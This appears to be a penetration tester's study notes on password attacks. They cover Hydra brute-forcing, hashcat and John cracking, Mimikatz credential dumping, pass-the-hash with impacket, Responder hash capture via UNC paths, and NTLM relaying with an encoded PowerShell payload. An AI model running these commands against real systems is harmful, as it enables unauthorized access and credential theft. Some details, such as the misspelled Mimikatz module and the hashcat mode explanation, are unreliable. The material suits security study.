---
layout: blank
pagetitle: Password Attacks
---

### Hydra
- Can be used on a lot of things
- SSH:
	- `sudo hydra -l {username} -P {password_list} -s {port} ssh://{IP}`
	- Lets say we found a password, and want to spray it everywhere (like rdp)
		- `sudo hydra -L {username_list} -p {password} rdp://{IP}`
- HTTP:
	- Provide a username, password list, IP, endpoint to post to, ^PASS^ for the password used, and a string in the HTTP of the failed result
	- `sudo hydra -l {username} -P {password_list} {IP} http-post-form "/{endpoint}:{param1}=^PASS^:Login failed. Invalid"`
		- So, for example: `sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:user=admin&password=^PASS^:Login failed. Invalid"`
	- Could also likely just use ffuf (with a filter on size if app returns 200)

### Passwords
- AES is symmetric, RSA is asymmetric
- GPUs crack like a thousand times faster than CPUs

### Finding Passwords
- Just use noseyparker. Can scan file systems, cloned repositories, and even entire github organizations.
    - `noseyparker scan {repo/directory}`
    - `noseyparker scan --github-org={org}`
    - Show results with `noseyparker report`
- Make sure to save or delete the existing `datastore.np` before starting a new scan

### Password Cracking
- Mutating Wordlists:
	- https://github.com/frizb/Hashcat-Cheatsheet?tab=readme-ov-file
	- Sometimes wordlists might not match the minimum requirements of a password for a location being tested, so the wordlist can drop all of the unneeded passwords
	- `hashcat -r "$1 c $!" {password_list}` will capitalize the first letter of each password, append "1" to the end of each password, and then append "!" to the end of that password
		- Putting these rules into a file with newlines will create a new password for each newline, adding that lines modifications to that password
		- Hashcat provides some rules in `/usr/share/hashcat/rules/`, like `rockyou-30000`
			- They always seem to use `best64.rule`
	- These modifications can be stored in files and used when cracking--for example:
		- `hashcat -m 0 {hash} {password_list} -r {modification_file} --force`
- Ensure to find the type of hash before cracking to save time
- Extracting hashes:
	- Many methods, but here's a novel one:
		- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` will search for kdbx files (KeePass files) containing hashes
		- keepass2john {keepass_database_file} to extract hash
- Determining hash type:
	- `hashcat --help` will list a lot of info about types of hashes, so if we know where the hash is from, we can look it up here with `hashcat --help | grep -i "{identifier}`
		- This should return the hashcat mode for the hash, which is a number like 13400
- Cracking the hash:
	- `hashcat -m {hashcat_mode (e.g. 13400)} {hash} {wordlist} -r {mutation} --force`
		- Increase speed with `-O -w 4 --opencl-device-types 1,2`

### SSH Private Key Passphrase
- `ssh2john {private RSA SSH key file} > ssh.hash` will put the hash in a crack-able format
- `hashcat -m 22921 ssh.hash {password_list} -r {mutation} --force` will crack the SSH hash
	- 22921 comes from looking up \$6$ in the `hashcat --help` response
	- However, this might result in an error due to this cipher not being supported by hashcat
- John the Ripper 
	- Can handle the error above
	- Can use mutation rules, placed at the end of /etc/john/john.conf
	- `john --wordlist={password_list} --rules=sshRules {hash}` to crack

### NTLM
- NT LAN Manager or Net-NTLMv2
- Windows stores hashed passwords in the Security Account Manager (SAM) database file
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) can extract password hashes from memory as a basic user
	- Prebuilt version [here](https://github.com/gentilkiwi/mimikatz/releases)
	- Can dump plaintext passwords straight as an Administrator
	- Run with `.\mimikatz.exe`
	- `privilege::debug` gives us the `SeDebugPrivilege` to run below commands
	- `token::elevate` to elevate to SYSTEM user
	- `lsadump::sam` will dump NTLM hashes of local users
	- `sukurlsa::logonpasswords` will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets
- Crack NTLM
	- `hashcat -m 1000 {hash} {password_list} -r {mutations} --force`
- **Passing NTLM**
	- Don't necessarily need to crack the NTLM hash to use it
		- NTLM hashes aren't salted between sessions and remain static
	- Many tools available:
		- SMB enumeration: `smbclient` and `crackmapexec`
		- Command execution: `impacket` -> `psexec.py\/wmiexec.py`
		- `Mimikatz` can also pass-the-hash
	- Example - accessing SMB share with `smbclient`
		- `smbclient \\\\{IP}\\{SMB_share_endpoint} -U Administrator --pw-nt-hash {hash_from_Mimikatz}`
	- Example2 - getting a shell as an Administrator with `psexec.py`
		- Searches for a writeable share and uploads an exe to it, registers exe as a Windows service and starts it
		- `impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}` 
		- `impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}`
		- `impacket-smbexec -hashes lmhash:nthash {domain}/{user}@{IP}`
		- `impacket-atexec -hashes lmhash:nthash {domain}/{user}@{IP} {command}`
- Cracking Net-NTLMv2
	- Useful when we are an unprivileged user
	- We have the target start authentication against a machine we own, and capture the hash used during the authentication process
	- *Responder* is a good tool for capturing Net-NTLMv2 hashes
		- Sets up an SMB server that handles auth process and prints hashes
		- `sudo responder -I {network interface (like tap0)}` to run responder on any given network interface
	- Getting the target server to contact our server is tricky
		- With RCE, it's easy, just run something like `dir \\{Our_machine_IP}\share` on the machine running the responder server
			- Then, crack the hash with hashcat 5600
		- Without RCE, there are a couple different techniques
			- If there's a file upload on a webserver on the target, we can use a UNC path (`\\{our_IP}\share\xyz)` and the application may try to reach out for the file
				- This might not work if the slashes are the wrong way, so try something like `//{IP}/share.php` as the filename
			- I'd assume local file inclusion would have the same result
	- **Relay Attack**
		- Lets say you're in a situation where you're on a local admin account, but it's an admin on a different machine. Additionally, we can't crack the hash from the admin. 
		- Instead of printing the hash, forward it along using *ntlmrelayx*
		- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {IP} -c "powershell -enc {base64_command}"`
			- This will set up an SMB relay to the IP with a powershell command to run
			- Run SMB `dir` from the machine we own against the *ntlmrelayx* machine, which will immediately pass the hash received onto the target machine